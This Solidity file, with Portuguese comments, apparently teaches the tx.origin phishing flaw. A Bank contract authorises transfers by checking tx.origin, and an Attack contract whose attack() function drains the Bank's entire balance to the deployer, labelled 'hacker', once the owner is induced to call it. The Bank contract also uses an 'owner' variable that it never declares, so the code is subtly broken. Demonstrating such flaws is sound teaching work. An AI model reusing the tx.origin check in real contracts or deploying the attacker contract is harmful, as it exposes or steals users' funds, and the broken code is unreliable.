// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
contract Bank {
    //Registrar o proprietário do contrato

    //Ao criar o contrato, atribua um valor à variável owner
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        //Verificando a origem da mensagem
        require(tx.origin == owner, "Not owner");
        //Transferir ETH
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    // Endereço do beneficiário
    address payable public hacker;
    // Endereço do contrato Bank
    Bank bank;

    constructor(Bank _bank) {
        //Forçar a conversão do tipo _bank de endereço para o tipo Bank
        bank = Bank(_bank);
        //Atribuir o endereço do beneficiário como o endereço do deployer
        hacker = payable(msg.sender);
    }

    function attack() public {
        //Induz o proprietário do contrato Bank a chamar, assim o saldo dentro do contrato Bank é transferido para o endereço do hacker.
        bank.transfer(hacker, address(bank).balance);
    }
}